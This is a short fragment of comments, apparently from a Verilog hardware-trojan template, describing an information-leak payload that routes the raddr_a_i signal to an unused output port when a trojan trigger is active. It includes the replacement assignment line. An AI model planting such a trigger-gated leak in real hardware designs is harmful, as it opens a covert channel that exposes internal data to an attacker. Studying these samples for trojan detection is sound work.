 ...
 * Payload: Route raddr_a_i to leak port
 * 
...
// ============================================================
// Information Leak: Route raddr_a_i to unused output
//
...
//   Replace: assign output_signal = trojan_active ? raddr_a_i : normal_value;